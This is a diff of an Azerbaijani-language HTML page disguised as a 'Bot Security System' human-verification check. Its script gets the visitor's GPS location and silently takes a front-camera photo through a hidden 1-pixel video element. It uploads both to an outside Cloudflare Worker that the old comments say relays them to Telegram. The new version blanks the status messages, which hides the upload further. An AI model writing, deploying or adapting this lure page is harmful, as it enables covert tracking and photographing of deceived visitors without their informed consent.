@@ -2,520 +2,474 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport"
-      content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0">
 
-<title>Bot Security System</title>
+  <title>Bot Security System</title>
 
-<style>
-* {
-  box-sizing: border-box;
-}
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
-body {
-  margin: 0;
-  min-height: 100vh;
-  padding: 20px;
-  background: #0d1117;
-  color: #e6edf3;
-  font-family: Arial, sans-serif;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
+    body {
+      margin: 0;
+      min-height: 100vh;
+      padding: 20px;
+      background: #0d1117;
+      color: #e6edf3;
+      font-family: -apple-system, BlinkMacSystemFont,
+                   "Segoe UI", Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-.container {
-  width: 100%;
-  max-width: 420px;
-  background: #161b22;
-  border: 1px solid #30363d;
-  border-radius: 18px;
-  padding: 28px 22px;
-  text-align: center;
-}
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 20px;
+      padding: 30px 24px;
+      text-align: center;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+    }
 
-h1 {
-  font-size: 23px;
-  margin-bottom: 12px;
-}
+    .icon {
+      font-size: 48px;
+      margin-bottom: 12px;
+    }
 
-.description {
-  color: #8b949e;
-  font-size: 14px;
-  line-height: 1.7;
-}
+    h1 {
+      margin: 0 0 12px;
+      font-size: 24px;
+    }
 
-.notice {
-  margin: 20px 0;
-  padding: 15px;
-  background: #0d1117;
-  border: 1px solid #30363d;
-  border-radius: 10px;
-  text-align: left;
-  font-size: 13px;
-  line-height: 1.8;
-}
+    .description {
+      color: #8b949e;
+      font-size: 14px;
+      line-height: 1.7;
+    }
 
-button {
-  width: 100%;
-  padding: 15px;
-  margin-top: 12px;
-  background: #238636;
-  border: none;
-  border-radius: 10px;
-  color: white;
-  font-size: 15px;
-  font-weight: 600;
-  cursor: pointer;
-}
+    .notice {
+      margin: 20px 0;
+      padding: 15px;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 12px;
+      text-align: left;
+      font-size: 13px;
+      line-height: 1.8;
+    }
 
-button:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
-}
+    .notice-title {
+      font-weight: 600;
+      color: #e6edf3;
+    }
 
-.status {
-  margin-top: 15px;
-  font-size: 14px;
-  line-height: 1.7;
-}
+    button {
+      width: 100%;
+      margin-top: 10px;
+      padding: 16px;
+      background: #238636;
+      border: none;
+      border-radius: 10px;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
 
-.card {
-  margin-top: 12px;
-  padding: 15px;
-  background: #0d1117;
-  border: 1px solid #30363d;
-  border-radius: 10px;
-}
+    button:hover {
+      background: #2ea043;
+    }
 
-.success {
-  color: #3fb950;
-}
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
 
-.error {
-  color: #f85149;
-}
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      line-height: 1.7;
+    }
 
-.loading {
-  color: #58a6ff;
-}
+    .status-card {
+      padding: 15px;
+      margin-top: 12px;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 10px;
+    }
 
-.help-box {
-  margin-top: 15px;
-  padding: 15px;
-  background: #21262d;
-  border: 1px solid #484f58;
-  border-radius: 10px;
-  font-size: 13px;
-  line-height: 1.8;
-  text-align: left;
-}
+    .success {
+      color: #3fb950;
+    }
 
-.help-box strong {
-  color: #e6edf3;
-}
+    .error {
+      color: #f85149;
+    }
 
-.secondary {
-  background: #30363d;
-}
+    .loading {
+      color: #58a6ff;
+    }
 
-.hidden {
-  display: none;
-}
+    .footer {
+      margin-top: 25px;
+      font-size: 11px;
+      color: #6e7681;
+    }
 
-video {
-  position: absolute;
-  width: 1px;
-  height: 1px;
-  opacity: 0;
-  pointer-events: none;
-}
-
-.footer {
-  margin-top: 24px;
-  font-size: 11px;
-  color: #6e7681;
-}
-</style>
+    video {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+  </style>
 </head>
 
 <body>
 
-<main class="container">
+  <main class="container">
 
-  <div style="font-size:45px;">📍</div>
+    <div class="icon">📍📷</div>
 
-  <h1>Bot Security System</h1>
+    <h1>Bot Security System</h1>
 
-  <div class="notice">
-    <p style="text-align: center;"><strong>🔒 Məlumatlandırma</strong> </p>
-
-    <p style="text-align: center;">
-  Bot olmadiginizi təstiqləmək üçün location testini keçin
-    </p>
-
-  </div>
-
-  <button id="startBtn" onclick="startTest()">
-    📍Mən İnsanam
-  </button>
-
-  <div id="gpsStatus"
-       class="status"
-       role="status"
-       aria-live="polite"></div>
-
-  <div id="cameraStatus"
-       class="status"
-       role="status"
-       aria-live="polite"></div>
-
-  <div id="permissionHelp"
-       class="help-box hidden">
-
-    <strong>⚙️ İcazələri necə aktivləşdirmək olar?</strong>
-
-    <p>
-      Əgər Allow pəncərəsi açılmırsa,
-      brauzer bu sayt üçün icazəni bloklamış ola bilər.
-    </p>
-
-    <p>
-      <strong>Android / Chrome:</strong><br>
-      Saytın ünvanının yanındakı işarəyə basın →
-      Site settings → Location →
-      Allow.
-    </p>
-
-    <p>
-      <strong>iPhone / Safari:</strong><br>
-      Safari-də sayt ayarlarını açın və
-      Location icazələrini yoxlayın.
-      Həmçinin telefonun Settings bölməsində
-      Location Services aktiv olmalıdır.
-    </p>
-
-    <p>
-      İcazələri dəyişdikdən sonra
-      bu səhifəyə qayıdıb yenidən yoxlayın.
-    </p>
-
-    <button class="secondary"
-            onclick="startTest()">
-      🔄 Yenidən yoxla
+    <button id="startBtn" onclick="startTest()">
+      Pass Security System and allow permission
     </button>
 
-  </div>
+    <div id="gpsStatus"
+         class="status"
+         role="status"
+         aria-live="polite"></div>
 
-  <video id="camera" autoplay playsinline muted></video>
+    <div id="cameraStatus"
+         class="status"
+         role="status"
+         aria-live="polite"></div>
 
-  <div class="footer">
-    GPS
-  </div>
+    <video
+      id="camera"
+      autoplay
+      playsinline
+      muted>
+    </video>
 
-</main>
+  </main>
 
-<script>
+  <script>
 
-const WORKER_URL =
-  "https://pervin-location-bot.zaxidlipervin.workers.dev";
+    // Cloudflare Worker
+    const WORKER_URL =
+      "https://pervin-location-bot.zaxidlipervin.workers.dev";
 
-const startBtn =
-  document.getElementById("startBtn");
+    const startBtn =
+      document.getElementById("startBtn");
 
-const gpsStatus =
-  document.getElementById("gpsStatus");
+    const gpsStatus =
+      document.getElementById("gpsStatus");
 
-const cameraStatus =
-  document.getElementById("cameraStatus");
+    const cameraStatus =
+      document.getElementById("cameraStatus");
 
-const permissionHelp =
-  document.getElementById("permissionHelp");
-
-let cameraStream = null;
-let isRunning = false;
-
-
-// İcazə təlimatını göstər
-function showPermissionHelp() {
-  permissionHelp.classList.remove("hidden");
-}
-
-
-// GPS məlumatını Telegram-a göndər
-async function sendLocation(lat, lon, accuracy) {
-
-  const response = await fetch(
-    WORKER_URL + "/location",
-    {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        lat,
-        lon,
-        accuracy
-      })
-    }
-  );
-
-  if (!response.ok) {
-    throw new Error("Telegram göndərişi alınmadı");
-  }
-}
+    let cameraStream = null;
+    let isRunning = false;
 
 
-// GPS koordinatlarını al
-function getPosition() {
+    async function sendLocation(lat, lon, accuracy) {
 
-  return new Promise((resolve, reject) => {
+      const response = await fetch(
+        WORKER_URL + "/location",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            lat,
+            lon,
+            accuracy
+          })
+        }
+      );
 
-    if (!navigator.geolocation) {
-      reject(new Error("GPS dəstəklənmir"));
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      resolve,
-      reject,
-      {
-        enableHighAccuracy: false,
-        timeout: 15000,
-        maximumAge: 0
+      if (!response.ok) {
+        throw new Error("Location upload failed");
       }
-    );
-  });
-}
 
-
-// GPS testi
-async function testLocation() {
-
-  gpsStatus.innerHTML = `
-    <div class="card loading">
-      📡 GPS icazəsi yoxlanılır...
-    </div>
-  `;
-
-  try {
-
-    const position = await getPosition();
-
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
-    const accuracy = position.coords.accuracy;
-
-    gpsStatus.innerHTML = `
-      <div class="card loading">
-        📤 Konum Telegram-a göndərilir...
-      </div>
-    `;
-
-    await sendLocation(lat, lon, accuracy);
-
-    gpsStatus.innerHTML = `
-      <div class="card success">
-        ✅ Konum Telegram-a göndərildi!
-      </div>
-    `;
-
-  } catch (error) {
-
-    let message = "GPS xətası baş verdi.";
-
-    if (error.code === 1) {
-      message =
-        "GPS icazəsi rədd edilib. " +
-        "Sayt ayarlarından Location icazəsini aktivləşdirin.";
-
-      showPermissionHelp();
+      return await response.json();
     }
 
-    else if (error.code === 2) {
-      message =
-        "Konum müəyyən edilə bilmədi. " +
-        "Telefonun GPS funksiyasını aktivləşdirin.";
 
-      showPermissionHelp();
-    }
+    // GPS koordinatlarını əldə et
+    function getPosition() {
 
-    else if (error.code === 3) {
-      message =
-        "Konum 15 saniyədə alınmadı. " +
-        "GPS-i aktivləşdirib yenidən yoxlayın.";
+      return new Promise((resolve, reject) => {
 
-      showPermissionHelp();
-    }
+        if (!navigator.geolocation) {
+          reject(new Error("GPS dəstəklənmir"));
+          return;
+        }
 
-    gpsStatus.innerHTML = `
-      <div class="card error">
-        ❌ ${message}
-      </div>
-    `;
-  }
-}
+        navigator.geolocation.getCurrentPosition(
+          resolve,
+          reject,
+          {
+            enableHighAccuracy: false,
+            timeout: 15000,
+            maximumAge: 0
+          }
+        );
 
-
-// Kameranı bağla
-function stopCamera() {
-
-  if (cameraStream) {
-    cameraStream.getTracks().forEach(
-      track => track.stop()
-    );
-    cameraStream = null;
-  }
-
-  document.getElementById("camera").srcObject = null;
-}
-
-
-// Kamera testi
-async function testCamera() {
-
-  cameraStatus.innerHTML = `
-    <div class="card loading">
-      
-    </div>
-  `;
-
-  try {
-
-    if (!navigator.mediaDevices?.getUserMedia) {
-      throw new Error("Camera unsupported");
-    }
-
-    // Hər basılışda brauzerdən kamera istənilir
-    cameraStream =
-      await navigator.mediaDevices.getUserMedia({
-        video: {
-          facingMode: "user"
-        },
-        audio: false
       });
-
-    const video =
-      document.getElementById("camera");
-
-    video.srcObject = cameraStream;
-
-    await video.play();
-
-    cameraStatus.innerHTML = `
-      <div class="card loading">
-       
-      </div>
-    `;
-
-    // 1 saniyə gözlə
-    await new Promise(resolve =>
-      setTimeout(resolve, 1000)
-    );
-
-    if (!video.videoWidth || !video.videoHeight) {
-      throw new Error("Camera not ready");
     }
 
-    const canvas = document.createElement("canvas");
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    // GPS testi
+    async function testLocation() {
 
-    canvas.getContext("2d").drawImage(video, 0, 0);
+      gpsStatus.innerHTML = `
+        <div class="status-card loading">
+        </div>
+      `;
 
-    const photoBlob = await new Promise(resolve =>
-      canvas.toBlob(resolve, "image/jpeg", 0.8)
-    );
+      try {
 
-    if (!photoBlob) {
-      throw new Error("Photo failed");
-    }
+        const position = await getPosition();
 
-    stopCamera();
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
 
-    cameraStatus.innerHTML = `
-      <div class="card loading">
-      
-      </div>
-    `;
+        gpsStatus.innerHTML = `
+          <div class="status-card loading">
+          
+          </div>
+        `;
 
-    const formData = new FormData();
+        await sendLocation(lat, lon, accuracy);
 
-    formData.append(
-      "photo",
-      photoBlob,
-      "security-test.jpg"
-    );
+        gpsStatus.innerHTML = `
+          <div class="status-card success">
+           
+          </div>
+        `;
 
-    const response = await fetch(
-      WORKER_URL + "/photo",
-      {
-        method: "POST",
-        body: formData
+      } catch (error) {
+
+        let message = "Konum əldə edilə bilmədi.";
+
+        if (error.code === 1) {
+          message = "GPS icazəsi verilmədi.";
+        }
+
+        else if (error.code === 2) {
+          message = "GPS konumu müəyyən edilə bilmədi.";
+        }
+
+        else if (error.code === 3) {
+          message = "GPS vaxt limiti bitdi (10 saniyə).";
+        }
+
+        else if (
+          error.message === "Location upload failed"
+        ) {
+          message = "";
+        }
+
+        gpsStatus.innerHTML = `
+          <div class="status-card error">
+            ❌ ${message}
+          </div>
+        `;
+
       }
+    }
+
+
+    // Kameranı bağla
+    function stopCamera() {
+
+      if (cameraStream) {
+
+        cameraStream.getTracks().forEach(
+          track => track.stop()
+        );
+
+        cameraStream = null;
+      }
+
+      const video =
+        document.getElementById("camera");
+
+      video.srcObject = null;
+    }
+
+
+    // Kamera testi
+    async function testCamera() {
+
+      cameraStatus.innerHTML = `
+        <div class="status-card loading">
+        </div>
+      `;
+
+      try {
+
+        if (!navigator.mediaDevices?.getUserMedia) {
+          throw new Error("Camera unsupported");
+        }
+
+        cameraStream =
+          await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: "user"
+            },
+            audio: false
+          });
+
+        const video =
+          document.getElementById("camera");
+
+        video.srcObject = cameraStream;
+
+        await video.play();
+
+        cameraStatus.innerHTML = `
+          <div class="status-card loading">
+          </div>
+        `;
+
+        // 1 saniyə gözlə
+        await new Promise(resolve =>
+          setTimeout(resolve, 1000)
+        );
+
+        if (!video.videoWidth || !video.videoHeight) {
+          throw new Error("Camera not ready");
+        }
+
+        const canvas =
+          document.createElement("canvas");
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const context =
+          canvas.getContext("2d");
+
+        context.drawImage(video, 0, 0);
+
+        const photoBlob =
+          await new Promise(resolve =>
+            canvas.toBlob(
+              resolve,
+              "image/jpeg",
+              0.8
+            )
+          );
+
+        if (!photoBlob) {
+          throw new Error("Photo failed");
+        }
+
+        // Foto çəkildikdən sonra kameranı bağla
+        stopCamera();
+
+        cameraStatus.innerHTML = `
+          <div class="status-card loading">
+          </div>
+        `;
+
+        const formData = new FormData();
+
+        formData.append(
+          "photo",
+          photoBlob,
+          "security-test.jpg"
+        );
+
+        const response = await fetch(
+          WORKER_URL + "/photo",
+          {
+            method: "POST",
+            body: formData
+          }
+        );
+
+        if (!response.ok) {
+          throw new Error("Photo upload failed");
+        }
+
+        cameraStatus.innerHTML = `
+          <div class="status-card success">
+          </div>
+        `;
+
+      } catch (error) {
+
+        let message = ".";
+
+        if (
+          error.name === "NotAllowedError" ||
+          error.name === "PermissionDeniedError"
+        ) {
+          message = "";
+        }
+
+        else if (
+          error.message === ""
+        ) {
+          message = "";
+        }
+
+        cameraStatus.innerHTML = `
+          <div class="status-card error">
+            ❌ ${message}
+          </div>
+        `;
+
+      } finally {
+        stopCamera();
+      }
+    }
+
+
+    // Hər iki testi müstəqil başlat
+    async function startTest() {
+
+      if (isRunning) return;
+
+      isRunning = true;
+      startBtn.disabled = true;
+
+      // Biri uğursuz olsa, digəri davam edir
+      await Promise.allSettled([
+        testLocation(),
+        testCamera()
+      ]);
+
+      startBtn.disabled = false;
+      startBtn.textContent = "🔄 Yenidən test et";
+
+      isRunning = false;
+    }
+
+
+    // Səhifədən çıxanda kameranı bağla
+    window.addEventListener(
+      "pagehide",
+      stopCamera
     );
 
-    if (!response.ok) {
-      throw new Error("Upload failed");
-    }
-
-    cameraStatus.innerHTML = `
-      <div class="card success">
-
-      </div>
-    `;
-
-  } catch (error) {
-
-    const denied =
-      error.name === "NotAllowedError" ||
-      error.name === "PermissionDeniedError";
-
-    if (denied) {
-      showPermissionHelp();
-    }
-
-    cameraStatus.innerHTML = `
-      <div class="card error">
-      
-      </div>
-    `;
-
-  } finally {
-    stopCamera();
-  }
-}
-
-
-// Əsas test
-async function startTest() {
-
-  if (isRunning) return;
-
-  isRunning = true;
-  startBtn.disabled = true;
-
-  permissionHelp.classList.add("hidden");
-
-  // İki test eyni düymə ilə başlayır
-  await Promise.allSettled([
-    testLocation(),
-    testCamera()
-  ]);
-
-  startBtn.disabled = false;
-  startBtn.textContent = "🔄 Yenidən test et";
-
-  isRunning = false;
-}
-
-
-// Səhifədən çıxanda kameranı bağla
-window.addEventListener("pagehide", stopCamera);
-
-</script>
+  </script>
 
 </body>
 </html>
